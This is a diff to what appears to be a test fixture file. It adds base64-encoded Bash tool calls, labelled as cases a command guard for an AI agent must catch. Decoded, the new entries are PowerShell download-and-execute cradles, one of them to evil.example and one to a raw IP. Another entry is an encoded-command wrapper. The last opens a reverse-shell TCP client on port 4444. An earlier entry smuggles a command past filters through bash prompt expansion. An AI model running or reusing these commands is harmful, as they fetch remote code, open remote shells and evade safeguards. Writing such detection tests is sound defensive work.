@@ -158,5 +158,21 @@
  {
   "label": "bypass bash prompt expansion",
   "b64": "eyJ0b29sX25hbWUiOiAiQmFzaCIsICJ0b29sX2lucHV0IjogeyJjb21tYW5kIjogIng9J3RvdWNoIC90bXAvcCc7IGVjaG8gXCIke3hAUH1cIiJ9fQ=="
+ },
+ {
+  "label": "ps iex downloadstring",
+  "b64": "eyJ0b29sX25hbWUiOiAiQmFzaCIsICJ0b29sX2lucHV0IjogeyJjb21tYW5kIjogIklFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5leGFtcGxlL3gucHMxJykifX0="
+ },
+ {
+  "label": "ps encodedcommand base64",
+  "b64": "eyJ0b29sX25hbWUiOiAiQmFzaCIsICJ0b29sX2lucHV0IjogeyJjb21tYW5kIjogInBvd2Vyc2hlbGwgLUVuY29kZWRDb21tYW5kIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDa0EifX0="
+ },
+ {
+  "label": "ps iwr pipe iex raw ip",
+  "b64": "eyJ0b29sX25hbWUiOiAiQmFzaCIsICJ0b29sX2lucHV0IjogeyJjb21tYW5kIjogIml3ciBodHRwOi8vMTk0LjUuMjQ5LjE1Ny9hIHwgaWV4In19"
+ },
+ {
+  "label": "ps reverse shell tcpclient",
+  "b64": "eyJ0b29sX25hbWUiOiAiQmFzaCIsICJ0b29sX2lucHV0IjogeyJjb21tYW5kIjogIiRjPU5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxODUuMjIwLjEwMS40MicsNDQ0NCkifX0="
  }
 ]
